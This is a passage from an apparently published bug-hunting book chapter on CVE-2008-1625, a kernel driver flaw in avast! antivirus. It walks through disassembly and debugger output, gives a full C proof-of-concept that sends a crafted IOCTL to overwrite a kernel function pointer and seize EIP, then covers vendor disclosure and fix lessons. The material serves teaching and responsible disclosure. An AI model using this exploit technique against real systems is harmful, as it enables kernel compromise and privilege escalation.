+METHOD_BUFFERED</pre><p>So the driver uses the <code class="literal">METHOD_BUFFERED</code> transfer type to describe the input and output buffers of an IOCTL request. According to the buffer descriptions in the Windows Driver Kit, the input buffer of IOCTLs, which use the <code class="literal">METHOD_BUFFERED</code> transfer type, can be found at <code class="literal">Irp-&gt;AssociatedIrp.SystemBuffer</code>.<a id="IDX-CHP-6-0030" class="indexterm"/></p><p>Below is an example of a reference to the input buffer in the disassembly of <span class="emphasis"><em>Aavmker4.sys</em></span>:</p><a id="I_programlisting6_d1e6791"/><pre class="programlisting">[..]
+.text:00010CF1                 mov     eax, [ebx+0Ch]  ; ebx = address of IRP
+.text:00010CF4                 mov     eax, [eax]
+[..]</pre><p>In this example, <code class="literal">EBX</code> holds a pointer to the IRP structure. At address <code class="literal">.text:00010CF1</code>, the IRP structure member at offset <code class="literal">0x0c</code> is referenced.</p><a id="I_programlisting6_d1e6804"/><pre class="programlisting">kd&gt; <strong class="userinput"><code>dt -v -r 2 _IRP</code></strong>
+nt!_IRP
+struct _IRP, 21 elements, 0x70 bytes
+   +0x000 Type             : ??
+   +0x002 Size             : ??
+   +0x004 MdlAddress       : ????
+   +0x008 Flags            : ??
+   <strong class="userinput"><code>+0x00c AssociatedIrp    : union __unnamed, 3 elements, 0x4 bytes</code></strong>
+      +0x000 MasterIrp        : ????
+      +0x000 IrpCount         : ??
+      <strong class="userinput"><code>+0x000 SystemBuffer     : ????</code></strong>
+[..]</pre><p>The output of WinDbg shows that <code class="literal">AssociatedIrp</code> is located at this offset (<code class="literal">IRP-&gt;AssociatedIrp</code>). At address <code class="literal">.text:00010CF4</code>, the input buffer of the IOCTL call is referenced and stored in <code class="literal">EAX</code> (<code class="literal">Irp-&gt;AssociatedIrp.SystemBuffer</code>). Now that I had found the supported IOCTLs, as well as the IOCTL input data, I started searching for bugs.<a id="IDX-CHP-6-0031" class="indexterm"/><a id="IDX-CHP-6-0032" class="indexterm"/></p></div><div class="sect2" title="Step 6: Reverse Engineer the IOCTL Handler"><div class="titlepage"><div><div><h2 class="title"><a id="step_6_colon_reverse_engineer_the_ioctl"/>Step 6: Reverse Engineer the IOCTL Handler</h2></div></div></div><p>To find a possible security defect, I audited the handler code of one IOCTL at a time while tracing the supplied input data. When I came across the IOCTL code <code class="literal">0xB2D60030</code>, I found a subtle bug.</p><p>If the IOCTL code <code class="literal">0xB2D60030</code> is requested by a user space application, the following code is executed:</p><a id="I_programlisting6_d1e6854"/><pre class="programlisting">[..]
+.text:0001098C ; int __stdcall sub_1098C(int, PIRP Irp)
+.text:0001098C sub_1098C       proc near               ; DATA XREF: DriverEntry+130
+[..]
+<strong class="userinput"><code>.text:00010D28                 cmp     eax, 0B2D60030h ; IOCTL-Code == 0xB2D60030 ?</code></strong>
+.text:00010D2D                 jz      short loc_10DAB ; if so -&gt; loc_10DAB
+[..]</pre><p>If the requested IOCTL code matches <code class="literal">0xB2D60030</code> (see <code class="literal">.text:00010D28</code>), the assembler code at address <code class="literal">.text:00010DAB</code> (<code class="literal">loc_10DAB</code>) is executed:</p><a id="I_programlisting6_d1e6873"/><pre class="programlisting">[..]
+.text:000109B8            mov   esi, [eax+8]       ; ULONG InputBufferLength
+<strong class="userinput"><code>.text:000109BB            mov   [ebp+var_1C], esi</code></strong>
+[..]
+.text:00010DAB loc_10DAB:                          ; CODE XREF: sub_1098C+3A1
+<strong class="userinput"><code>.text:00010DAB            xor   edi, edi           ; EDI = 0</code></strong>
+.text:00010DAD            cmp   byte_1240C, 0
+.text:00010DB4            jz    short loc_10DC9
+[..]
+.text:00010DC9 loc_10DC9:                          ; CODE XREF: sub_1098C+428
+<strong class="userinput"><code>.text:00010DC9            mov   esi, [ebx+0Ch]     ; Irp-&gt;AssociatedIrp.SystemBuffer</code></strong>
+<strong class="userinput"><code>.text:00010DCC            cmp   [ebp+var_1C], 878h ; input data length == 0x878 ?</code></strong>
+.text:00010DD3            jz    short loc_10DDF    ; if so -&gt; loc_10DDF
+[..]</pre><p>At address <code class="literal">.text:00010DAB EDI</code> is set to 0. The <code class="literal">EBX</code> register holds a pointer to the IRP structure, and at address <code class="literal">.text:00010DC9</code> a pointer to the input buffer data is stored in <code class="literal">ESI</code> (<code class="literal">Irp-&gt;AssociatedIrp.SystemBuffer</code>).</p><p>At the beginning of the dispatch routine, the <code class="literal">InputBufferLength</code> of the request is stored in the stack variable <code class="literal">var_1c</code> (see <code class="literal">.text:000109BB</code>). The length of the input data at address <code class="literal">.text:00010DCC</code> is then compared to the value <code class="literal">0x878</code> (see <a class="xref" href="ch06.html#graph_view_of_the_vulnerable_code_path_i" title="Figure 6-4. Graph view of the vulnerable code path in IDA Pro, part 1">Figure 6-4</a>).</p><div class="figure"><a id="graph_view_of_the_vulnerable_code_path_i"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e6927"/><img src="httpatomoreillycomsourcenostarchimages939311.png.jpg" alt="Graph view of the vulnerable code path in IDA Pro, part 1"/></div></div><p class="title">Figure 6-4. Graph view of the vulnerable code path in IDA Pro, part 1</p></div><p>If the data length equals <code class="literal">0x878</code>, the user-controlled input data, pointed to by <code class="literal">ESI</code>, is further processed:<a id="IDX-CHP-6-0033" class="indexterm"/><a id="IDX-CHP-6-0034" class="indexterm"/></p><a id="I_programlisting6_d1e6946"/><pre class="programlisting">[..]
+.text:00010DDF loc_10DDF:                     ; CODE XREF: sub_1098C+447
+.text:00010DDF        mov   [ebp+var_4], edi
+<strong class="userinput"><code>.text:00010DE2        cmp   [esi], edi        ; ESI == input data</code></strong>
+.text:00010DE4        jz    short loc_10E34   ; if input data == NULL -&gt; loc_10E34
+[..]
+<strong class="userinput"><code>.text:00010DE6        mov   eax, [esi+870h]   ; ESI and EAX</code></strong>
+ <strong class="userinput"><code>are pointing to the →</code></strong>
+                                                <strong class="userinput"><code>input data</code></strong>
+<strong class="userinput"><code>.text:00010DEC        mov   [ebp+var_48], eax ; a pointer to user controlled data →</code></strong>
+                                                <strong class="userinput"><code>is stored in var_48</code></strong>
+<strong class="userinput"><code>.text:00010DEF        cmp   dword ptr [eax], 0D0DEAD07h  ; validation of input data</code></strong>
+.text:00010DF5        jnz   short loc_10E00
+[..]
+<strong class="userinput"><code>.text:00010DF7        cmp   dword ptr [eax+4], 10BAD0BAh ; validation of input data</code></strong>
+.text:00010DFE        jz    short loc_10E06
+[..]</pre><p>The code at address <code class="literal">.text:00010DE2</code> checks whether the input data equals NULL. If the input data is not NULL, a pointer from this data is extracted at <code class="literal">[user_data+0x870]</code> and stored in <code class="literal">EAX</code> (see <code class="literal">.text:00010DE6</code>). This pointer value is stored in the stack variable <code class="literal">var_48</code> (see <code class="literal">.text:00010DEC</code>). A check is then performed to see if the data, pointed to by <code class="literal">EAX</code>, starts with the values <code class="literal">0xD0DEAD07</code> and <code class="literal">0x10BAD0BA</code> (see <code class="literal">.text:00010DEF</code> and <code class="literal">.text:00010DF7</code>). If so, the parsing of the input data continues:</p><a id="I_programlisting6_d1e7010"/><pre class="programlisting">[..]
+.text:00010E06 loc_10E06:                              ; CODE XREF: sub_1098C+472
+.text:00010E06                 xor     edx, edx
+.text:00010E08                 mov     eax, [ebp+var_48]
+.text:00010E0B                 mov     [eax], edx
+.text:00010E0D                 mov     [eax+4], edx
+<strong class="userinput"><code>.text:00010E10                 add     esi, 4         ; source address</code></strong>
+<strong class="userinput"><code>.text:00010E13                 mov     ecx, 21Ah      ; length</code></strong>
+<strong class="userinput"><code>.text:00010E18                 mov     edi, [eax+18h] ; destination address</code></strong>
+<strong class="userinput"><code>.text:00010E1B                 rep movsd              ; memcpy()</code></strong>
+[..]</pre><p>The <code class="literal">rep movsd</code> instruction at address <code class="literal">.text:00010E1B</code> represents a <code class="literal">memcpy()</code> function. So <code class="literal">ESI</code> holds the source address, <code class="literal">EDI</code> holds the destination address, and <code class="literal">ECX</code> holds the length for the copy operation. <code class="literal">ECX</code> gets assigned the value <code class="literal">0x21a</code> (see <code class="literal">.text:00010E13</code>). <code class="literal">ESI</code> points to the user-controlled IOCTL data (see <code class="literal">.text:00010E10</code>), and <code class="literal">EDI</code> is also derived from user-controlled data pointed to by <code class="literal">EAX</code> (see <code class="literal">.text:00010E18</code> and <a class="xref" href="ch06.html#graph_view_of_the_vulnerable_code_pa" title="Figure 6-5. Graph view of the vulnerable code path in IDA Pro, part 2">Figure 6-5</a>).</p><div class="figure"><a id="graph_view_of_the_vulnerable_code_pa"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e7075"/><img src="httpatomoreillycomsourcenostarchimages939313.png.jpg" alt="Graph view of the vulnerable code path in IDA Pro, part 2"/></div></div><p class="title">Figure 6-5. Graph view of the vulnerable code path in IDA Pro, part 2</p></div><p>Here’s some pseudo C code of that <code class="literal">memcpy()</code> call:</p><a id="I_programlisting6_d1e7085"/><pre class="programlisting">memcpy ([EAX+0x18], ESI + 4, 0x21a * 4);</pre><p>Or, in more abstract terms:</p><a id="I_programlisting6_d1e7089"/><pre class="programlisting">memcpy (user_controlled_address, user_controlled_data, 0x868);</pre><p>It is therefore possible to write <code class="literal">0x868</code> bytes (<code class="literal">0x21a * 4</code> bytes, as the <code class="literal">rep movsd</code> instruction copies DWORDs from one location to another) of user-controllable data to an arbitrary user-controlled address in either user or kernel space. Nice!<a id="IDX-CHP-6-0035" class="indexterm"/></p><p>The anatomy of the bug, diagrammed in <a class="xref" href="ch06.html#overview_of_the_vulnerability_from_ioctl" title="Figure 6-6. Overview of the vulnerability from IOCTL request to memory corruption">Figure 6-6</a>, is as follows:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>An IOCTL request (<code class="literal">0xB2D60030</code>) is sent to the kernel driver <span class="emphasis"><em>Aavmker4.sys</em></span> using the <code class="literal">AavmKer4</code> device.</p></li><li class="listitem"><p>The driver code checks whether the IOCTL input data length equals the value <code class="literal">0x878</code>. If so, proceed to step 3.</p><div class="figure"><a id="overview_of_the_vulnerability_from_ioctl"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e7131"/><img src="httpatomoreillycomsourcenostarchimages939315.png.jpg" alt="Overview of the vulnerability from IOCTL request to memory corruption"/></div></div><p class="title">Figure 6-6. Overview of the vulnerability from IOCTL request to memory corruption</p></div></li><li class="listitem"><p>The driver checks whether the user-controlled IOCTL input data contains the values <code class="literal">0xD0DEAD07</code> and <code class="literal">0x10BAD0BA</code>. If so, proceed to step 4.</p></li><li class="listitem"><p>The erroneous <code class="literal">memcpy()</code> call is executed.</p></li><li class="listitem"><p>The memory is corrupted.</p></li></ol></div></div></div></div>
+<div class="sect1" title="6.2 Exploitation"><div class="titlepage"><div><div><h1 class="title"><a id="exploitation-id4"/>6.2 Exploitation</h1></div></div></div><p>To gain control of <code class="literal">EIP</code>, I first had to find a suitable target address to overwrite. While searching through the IOCTL dispatch routine, I found two places where a function pointer is called:</p><a id="I_programlisting6_d1e7162"/><pre class="programlisting">[..]
+.text:00010D8F            push    2               ; _DWORD
+.text:00010D91            push    1               ; _DWORD
+.text:00010D93            push    1               ; _DWORD
+.text:00010D95            push    dword ptr [eax] ; _DWORD
+.text:00010D97            call    KeGetCurrentThread
+.text:00010D9C            push    eax             ; _DWORD
+<strong class="userinput"><code>.text:00010D9D            call    dword_12460     ; the function pointer is called</code></strong>
+.text:00010DA3            mov     [ebx+18h], eax
+.text:00010DA6            jmp     loc_10F04
+[..]
+.text:00010DB6            push    2               ; _DWORD
+.text:00010DB8            push    1               ; _DWORD
+.text:00010DBA            push    1               ; _DWORD
+.text:00010DBC            push    edi             ; _DWORD
+.text:00010DBD            call    KeGetCurrentThread
+.text:00010DC2            push    eax             ; _DWORD
+<strong class="userinput"><code>.text:00010DC3            call    dword_12460     ; the function pointer is called</code></strong>
+[..]
+<strong class="userinput"><code>.data:00012460 ; int (__stdcall *dword_12460)(_DWORD,</code></strong>
+ <strong class="userinput"><code>_DWORD, _DWORD, _DWORD, _DWORD)</code></strong>
+<strong class="userinput"><code>.data:00012460 dword_12460     dd 0               ; the function pointer is declared</code></strong>
+[..]</pre><p>The function pointer declared at <code class="literal">.data:00012460</code> is called at <code class="literal">.text:00010D9D</code> and <code class="literal">.text:00010DC3</code> in the dispatch routine. To gain control over <code class="literal">EIP</code>, all I had to do was overwrite this function pointer and then wait for it to be called. I wrote the following POC code to manipulate the function pointer:</p><div class="example"><a id="the_poc_code_that_i_wrote_to"/><p class="title">Example 6-2. The POC code that I wrote to manipulate the function pointer at <code class="literal">.data:00012460</code> (<span class="emphasis"><em>poc.c</em></span>)</p><div class="example-contents"><pre class="programlisting">01    #include &lt;windows.h&gt;
+ 02    #include &lt;winioctl.h&gt;
+ 03    #include &lt;stdio.h&gt;
+ 04    #include &lt;psapi.h&gt;
+ 05
+ 06    #define IOCTL            0xB2D60030  // vulnerable IOCTL
+ 07    #define INPUTBUFFER_SIZE 0x878       // input data length
+ 08
+ 09    __inline void
+ 10    memset32 (void* dest, unsigned int fill, unsigned int count)
+ 11    {
+ 12     if (count &gt; 0) {
+ 13       _asm {
+ 14         mov   eax, fill   // pattern
+ 15         mov   ecx, count  // count
+ 16         mov   edi, dest   // dest
+ 17         rep   stosd;
+ 18       }
+ 19     }
+ 20    }
+ 21
+ 22    unsigned int
+ 23    GetDriverLoadAddress (char *drivername)
+ 24    {
+ 25     LPVOID        drivers[1024];
+ 26     DWORD         cbNeeded  = 0;
+ 27     int           cDrivers  = 0;
+ 28     int           i         = 0;
+ 29     const char *  ptr       = NULL;
+ 30     unsigned int  addr      = 0;
+ 31
+ 32     if (EnumDeviceDrivers (drivers, sizeof (drivers), &amp;cbNeeded) &amp;&amp;
+ 33                            cbNeeded &lt; sizeof (drivers)) {
+ 34       char szDriver[1024];
+ 35
+ 36       cDrivers = cbNeeded / sizeof (drivers[0]);
+ 37
+ 38       for (i = 0; i &lt; cDrivers; i++) {
+ 39         if (GetDeviceDriverBaseName (drivers[i], szDriver,
+ 40                                      sizeof (szDriver) / sizeof (szDriver[0]))) {
+ 41           if (!strncmp (szDriver, drivername, 8)) {
+ 42             printf ("%s (%08x)\n", szDriver, drivers[i]);
+ 43             return (unsigned int)(drivers[i]);
+ 44           }
+ 45         }
+ 46       }
+ 47     }
+ 48
+ 49     fprintf (stderr, "ERROR: cannot get address of driver %s\n", drivername);
+ 50
+ 51     return 0;
+ 52    }
+ 53
+ 54    int
+ 55    main (void)
+ 56    {
+ 57      HANDLE        hDevice;
+ 58      char *        InputBuffer       = NULL;
+ 59      BOOL          retval            = TRUE;
+ 60      unsigned int  driveraddr        = 0;
+ 61      unsigned int  pattern1          = 0xD0DEAD07;
+ 62      unsigned int  pattern2          = 0x10BAD0BA;
+ 63      unsigned int  addr_to_overwrite = 0;      // address to overwrite
+ 64      char          data[2048];
+ 65
+ 66      // get the base address of the driver
+ 67      if (!(driveraddr = GetDriverLoadAddress ("Aavmker4"))) {
+ 68        return 1;
+ 69      }
+ 70
+ 71      // address of the function pointer at .data:00012460 that gets overwritten
+ 72      addr_to_overwrite = driveraddr + 0x2460;
+ 73
+ 74      // allocate InputBuffer
+ 75      InputBuffer = (char *)VirtualAlloc ((LPVOID)0,
+ 76                        INPUTBUFFER_SIZE,
+ 77                        MEM_COMMIT | MEM_RESERVE,
+ 78                        PAGE_EXECUTE_READWRITE);
+ 79
+ 80      /////////////////////////////////////////////////////////////////////////////
+ 81      // InputBuffer data:
+ 82      //
+ 83      // .text:00010DC9  mov esi, [ebx+0Ch]  ; ESI == InputBuffer
+ 84
+ 85      // fill InputBuffer with As
+ 86      memset (InputBuffer, 0x41, INPUTBUFFER_SIZE);
+ 87
+ 88      // .text:00010DE6  mov eax, [esi+870h] ; EAX == pointer to "data"
+ 89      memset32 (InputBuffer + 0x870, (unsigned int)&amp;data, 1);
+ 90
+ 91      /////////////////////////////////////////////////////////////////////////////
+ 92      // data:
+ 93      //
+ 94
+ 95      // As the "data" buffer is used as a parameter for a
+ "KeSetEvent" windows kernel
+ 96      // function, it needs to contain some valid pointers
+ (.text:00010E2C call ds:KeSetEvent)
+ 97      memset32 (data, (unsigned int)&amp;data, sizeof (data) / sizeof (unsigned int));
+ 98
+ 99      // .text:00010DEF  cmp dword ptr [eax], 0D0DEAD07h ; EAX == pointer to "data"
+100      memset32 (data, pattern1, 1);
+101
+102      // .text:00010DF7  cmp dword ptr [eax+4], 10BAD0BAh ; EAX
+ == pointer to "data"
+103      memset32 (data + 4, pattern2, 1);
+104
+105      // .text:00010E18 mov edi, [eax+18h] ; EAX == pointer to "data"
+106      memset32 (data + 0x18, addr_to_overwrite, 1);
+107
+108      /////////////////////////////////////////////////////////////////////////////
+109      // open device
+110      hDevice = CreateFile (TEXT("\\\\.\\AavmKer4"),
+111                  GENERIC_READ | GENERIC_WRITE,
+112                  FILE_SHARE_READ | FILE_SHARE_WRITE,
+113                  NULL,
+114                  OPEN_EXISTING,
+115                  0,
+116                  NULL);
+117
+118      if (hDevice != INVALID_HANDLE_VALUE) {
+119        DWORD retlen = 0;
+120
+121        // send evil IOCTL request
+122        retval = DeviceIoControl (hDevice,
+123                      IOCTL,
+124                      (LPVOID)InputBuffer,
+125                      INPUTBUFFER_SIZE,
+126                      (LPVOID)NULL,
+127                      0,
+128                      &amp;retlen,
+129                      NULL);
+130
+131        if (!retval) {
+132          fprintf (stderr, "[-] Error: DeviceIoControl failed\n");
+133        }
+134
+135      } else {
+136        fprintf (stderr, "[-] Error: Unable to open device.\n");
+137      }
+138
+139      return (0);
+140    }</pre></div></div><p>In line 67 of <a class="xref" href="ch06s02.html#the_poc_code_that_i_wrote_to" title="Example 6-2. The POC code that I wrote to manipulate the function pointer at .data:00012460 (poc.c)">Example 6-2</a>, the base address of the driver in memory is stored in <code class="literal">driveraddr</code>. Then, in line 72, the address of the function pointer is calculated; this is overwritten by the manipulated <code class="literal">memcpy()</code> call. A buffer of <code class="literal">INPUTBUFFER_SIZE</code> (<code class="literal">0x878</code>) bytes is allocated in line 75. This buffer holds the IOCTL input data, which is filled with the hexadecimal value <code class="literal">0x41</code> (see line 86). Then a pointer to another data array is copied into the input data buffer (see line 89). In the disassembly of the driver, this pointer is referenced at address <code class="literal">.text:00010DE6</code>: <code class="literal">mov eax, [esi+870h]</code>.</p><p>Directly after the call of the <code class="literal">memcpy()</code> function, the kernel function <code class="literal">KeSetEvent()</code> is called:<a id="IDX-CHP-6-0036" class="indexterm"/></p><a id="I_programlisting6_d1e7241"/><pre class="programlisting">[..]
+.text:00010E10                 add     esi, 4          ; source address
+.text:00010E13                 mov     ecx, 21Ah       ; length
+.text:00010E18                 mov     edi, [eax+18h]  ; destination address
+.text:00010E1B                 rep movsd               ; memcpy()
+.text:00010E1D                 dec     PendingCount2
+.text:00010E23                 inc     dword ptr [eax+20h]
+.text:00010E26                 push    edx             ; Wait
+.text:00010E27                 push    edx             ; Increment
+.text:00010E28                 add     eax, 8
+<strong class="userinput"><code>.text:00010E2B                 push    eax             ; Parameter of KeSetEvent</code></strong>
+<strong class="userinput"><code>.text:00010E2B                                         ; (eax = IOCTL input data)</code></strong>
+<strong class="userinput"><code>.text:00010E2C                 call    ds:KeSetEvent   ; KeSetEvent is called</code></strong>
+.text:00010E32                 xor     edi, edi
+[..]</pre><p>Since the user-derived data pointed to by <code class="literal">EAX</code> is used as a parameter for this function (see <code class="literal">.text:00010E2B</code>), the data buffer needs to be filled with valid pointers in order to prevent an access violation. I filled the whole buffer with its own valid user space address (see line 97). Then in lines 100 and 103, the two expected patterns are copied into the data buffer (see <code class="literal">.text:00010DEF</code> and <code class="literal">.text:00010DF7</code>), and in line 106, the destination address for the <code class="literal">memcpy()</code> function is copied into the data buffer (<code class="literal">.text:00010E18 mov edi, [eax+18h]</code>). The device of the driver is then opened for reading and writing (see line 110), and the malicious IOCTL request is sent to the vulnerable kernel driver (see line 122).</p><p>After I developed that POC code, I started the Windows XP VMware guest system and attached WinDbg to the kernel (see Section B.2 for a description of the following debugger commands):<a id="IDX-CHP-6-0037" class="indexterm"/><a id="IDX-CHP-6-0038" class="indexterm"/><a id="IDX-CHP-6-0039" class="indexterm"/></p><a id="I_programlisting6_d1e7286"/><pre class="programlisting">kd&gt; <strong class="userinput"><code>.sympath SRV*c:\WinDBGSymbols*http://msdl.microsoft.com/download/symbols</code></strong>
+kd&gt; <strong class="userinput"><code>.reload</code></strong>
+[..]
+kd&gt; <strong class="userinput"><code>g</code></strong>
+Break instruction exception - code 80000003 (first chance)
+*******************************************************************************
+*                                                                             *
+*   You are seeing this message because you pressed either                    *
+*       CTRL+C (if you run kd.exe) or,                                        *
+*       CTRL+BREAK (if you run WinDBG),                                       *
+*   on your debugger machine's keyboard.                                      *
+*                                                                             *
+*                   THIS IS NOT A BUG OR A SYSTEM CRASH                       *
+*                                                                             *
+* If you did not intend to break into the debugger, press the "g" key, then   *
+* press the "Enter" key now.  This message might immediately reappear.  If it *
+* does, press "g" and "Enter" again.                                          *
+*                                                                             *
+*******************************************************************************
+nt!RtlpBreakWithStatusInstruction:
+80527bdc cc              int     3
+
+kd&gt; <strong class="userinput"><code>g</code></strong></pre><p>I then compiled the POC code with the command-line C compiler of Visual Studio (<code class="literal">cl</code>) and executed it as an unprivileged user inside the VMware guest system:</p><a id="I_programlisting6_d1e7305"/><pre class="programlisting">C:\BHD\avast&gt;<strong class="userinput"><code>cl /nologo poc.c psapi.lib</code></strong>
+C:\BHD\avast&gt;<strong class="userinput"><code>poc.exe</code></strong></pre><p>After I executed the POC code, nothing happened. So how could I find out if the function pointer was successfully manipulated? Well, all I had to do was trigger the antivirus engine by opening an arbitrary executable. I opened Internet Explorer and got the following message in the debugger:</p><a id="I_programlisting6_d1e7314"/><pre class="programlisting">#################### AAVMKER: WRONG RQ ######################!
+Access violation - code c0000005 (!!! second chance !!!)
+                     41414141 ??                ???</pre><p>Yes! The instruction pointer appeared to be under my full control. To verify this, I asked the debugger for more information:</p><a id="I_programlisting6_d1e7318"/><pre class="programlisting">kd&gt; <strong class="userinput"><code>kb</code></strong>
+ChildEBP RetAddr  Args to Child
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+<strong class="userinput"><code>ee91abc0 f7925da3 862026a8 e1cd33a8 00000001 0x41414141</code></strong>
+ee91ac34 804ee119 86164030 860756b8 806d22d0 Aavmker4+0xda3
+ee91ac44 80574d5e 86075728 861494e8 860756b8 nt!IopfCallDriver+0x31
+ee91ac58 80575bff 86164030 860756b8 861494e8 nt!IopSynchronousServiceTail+0x70
+ee91ad00 8056e46c 0000011c 00000000 00000000 nt!IopXxxControlFile+0x5e7
+ee91ad34 8053d638 0000011c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
+ee91ad34 7c90e4f4 0000011c 00000000 00000000 nt!KiFastCallEntry+0xf8
+0184c4d4 650052be 0000011c b2d60034 0184ff74 0x7c90e4f4
+0184ffb4 7c80b713 0016d2a0 00150000 0016bd90 0x650052be
+0184ffec 00000000 65004f98 0016d2a0 00000000 0x7c80b713
+
+kd&gt; <strong class="userinput"><code>r</code></strong>
+eax=862026a8 ebx=860756b8 ecx=b2d6005b edx=00000000 esi=00000008 edi=861494e8
+<strong class="userinput"><code>eip=41414141</code></strong> esp=ee91abc4 ebp=ee91ac34 iopl=0         nv up ei pl nz na po nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
+41414141 ??              ???</pre><p>The exploitation process, illustrated in <a class="xref" href="ch06s02.html#diagram_of_my_exploitation_of_the_avast" title="Figure 6-7. Diagram of my exploitation of the avast! vulnerability">Figure 6-7</a>, was as follows:</p><div class="orderedlist"><ol class="orderedlist"><li class="listitem"><p>Is the length of the input data <code class="literal">0x878</code>? If so, proceed to step 2.</p></li><li class="listitem"><p>The user space buffer <code class="literal">data</code> gets referenced.</p></li><li class="listitem"><p>Are the expected patterns found at <code class="literal">data[0]</code> and <code class="literal">data[4]</code>? If so, proceed to step 4.<a id="IDX-CHP-6-0040" class="indexterm"/></p><div class="figure"><a id="diagram_of_my_exploitation_of_the_avast"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e7364"/><img src="httpatomoreillycomsourcenostarchimages939317.png.jpg" alt="Diagram of my exploitation of the avast! vulnerability"/></div></div><p class="title">Figure 6-7. Diagram of my exploitation of the avast! vulnerability</p></div></li><li class="listitem"><p>The destination address for the <code class="literal">memcpy()</code> call gets referenced.</p></li><li class="listitem"><p>The <code class="literal">memcpy()</code> function copies the IOCTL input data into the <code class="literal">.data</code> area of the kernel.</p></li><li class="listitem"><p>The manipulated function pointer gives full control over <code class="literal">EIP</code>.</p></li></ol></div><p>If the POC code is executed without a kernel debugger attached, the famed Blue Screen of Death (BSoD) will appear (see <a class="xref" href="ch06s02.html#the_blue_screen_of_death_open_parenthesi" title="Figure 6-8. The Blue Screen of Death (BSoD)">Figure 6-8</a>).<a id="IDX-CHP-6-0041" class="indexterm"/></p><div class="figure"><a id="the_blue_screen_of_death_open_parenthesi"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e7400"/><img src="httpatomoreillycomsourcenostarchimages939319.png.jpg" alt="The Blue Screen of Death (BSoD)"/></div></div><p class="title">Figure 6-8. The Blue Screen of Death (BSoD)</p></div><p>After I gained control over <code class="literal">EIP</code>, I developed two exploits. One of them grants SYSTEM rights to any requesting user (privilege escalation), and the other installs a rootkit into the kernel using the well-known Direct Kernel Object Manipulation (DKOM) technique.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-16" class="footnoteref">72</a>]</sup><a id="IDX-CHP-6-0042" class="indexterm"/><a id="IDX-CHP-6-0043" class="indexterm"/><a id="IDX-CHP-6-0044" class="indexterm"/><a id="IDX-CHP-6-0045" class="indexterm"/></p><p>Strict laws prohibit me from providing a full, working exploit, but if you’re interested, you can watch a video of the exploit in action at the book’s website.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-17" class="footnoteref">73</a>]</sup></p></div>
+<div class="sect1" title="6.3 Vulnerability Remediation"><div class="titlepage"><div><div><h1 class="title"><a id="vulnerability_remediation-id4"/>6.3 Vulnerability Remediation</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Saturday, March 29, 2008</em></span></p></div><p>I informed ALWIL Software about the bug on March 18, 2008, and it released an updated version of avast! today. Wow, that was really fast for a commercial software vendor!</p></div>
+<div class="sect1" title="6.4 Lessons Learned"><div class="titlepage"><div><div><h1 class="title"><a id="lessons_learned-id4"/>6.4 Lessons Learned</h1></div></div></div><p>As a programmer and kernel-driver developer:</p><div class="itemizedlist"><ul class="itemizedlist"><li class="listitem"><p>Define strict security settings for exported device objects. Do not allow unprivileged users to read from or write to these devices.</p></li><li class="listitem"><p>Always take care to validate input data correctly.</p></li><li class="listitem"><p>Destination addresses for memory-copy operations shouldn’t be extracted from user-supplied data.</p></li></ul></div></div>
+<div class="sect1" title="6.5 Addendum"><div class="titlepage"><div><div><h1 class="title"><a id="addendum-id4"/>6.5 Addendum</h1></div></div></div><div class="note" title="Note"><h3 class="title">Note</h3><p><span class="emphasis"><em>Sunday, March 30, 2008</em></span></p></div><p>Since the vulnerability was fixed and a new version of avast! is now available, I released a detailed security advisory on my website today.<sup>[<a href="ch06s05.html#ftn.CHP-6-FN-18" class="footnoteref">74</a>]</sup> The bug was assigned CVE-2008-1625. <a class="xref" href="ch06s05.html#timeline_from_vendor_notification_to_the" title="Figure 6-9. Timeline from vendor notification to the release of my security advisory">Figure 6-9</a> shows the timeline of the vulnerability fix.<a id="IDX-CHP-6-0046" class="indexterm"/></p><div class="figure"><a id="timeline_from_vendor_notification_to_the"/><div class="figure-contents"><div class="mediaobject"><a id="I_mediaobject6_d1e7474"/><img src="httpatomoreillycomsourcenostarchimages939321.png.jpg" alt="Timeline from vendor notification to the release of my security advisory"/></div></div><p class="title">Figure 6-9. Timeline from vendor notification to the release of my security advisory</p></div><div class="sect2" title="Notes"><div class="titlepage"><div><div><h2 class="title"><a id="notes-id5"/>Notes</h2></div></div></div><p><sup>[<a id="CHP-6-FN-1" href="#ftn.CHP-6-FN-1" class="footnote">57</a>]</sup></p><p><sup>[<a id="CHP-6-FN-2" href="#ftn.CHP-6-FN-2" class="footnote">58</a>]</sup></p><p><sup>[<a id="CHP-6-FN-3" href="#ftn.CHP-6-FN-3" class="footnote">59</a>]</sup></p><p><sup>[<a id="CHP-6-FN-4" href="#ftn.CHP-6-FN-4" class="footnote">60</a>]</sup></p><p><sup>[<a id="CHP-6-FN-5" href="#ftn.CHP-6-FN-5" class="footnote">61</a>]</sup></p><p><sup>[<a id="CHP-6-FN-6" href="#ftn.CHP-6-FN-6" class="footnote">62</a>]</sup></p><p><sup>[<a id="CHP-6-FN-7" href="#ftn.CHP-6-FN-7" class="footnote">63</a>]</sup></p><p><sup>[<a id="CHP-6-FN-8" href="#ftn.CHP-6-FN-8" class="footnote">64</a>]</sup></p><p><sup>[<a id="CHP-6-FN-9" href="#ftn.CHP-6-FN-9" class="footnote">65</a>]</sup></p><p><sup>[<a id="CHP-6-FN-10" href="#ftn.CHP-6-FN-10" class="footnote">66</a>]</sup></p><p><sup>[<a id="CHP-6-FN-11" href="#ftn.CHP-6-FN-11" class="footnote">67</a>]</sup></p><p><sup>[<a id="CHP-6-FN-12" href="#ftn.CHP-6-FN-12" class="footnote">68</a>]</sup></p><p><sup>[<a id="CHP-6-FN-13" href="#ftn.CHP-6-FN-13" class="footnote">69</a>]</sup></p><p><sup>[<a id="CHP-6-FN-14" href="#ftn.CHP-6-FN-14" class="footnote">70</a>]</sup></p><p><sup>[<a id="CHP-6-FN-15" href="#ftn.CHP-6-FN-15" class="footnote">71</a>]</sup></p><p><sup>[<a id="CHP-6-FN-16" 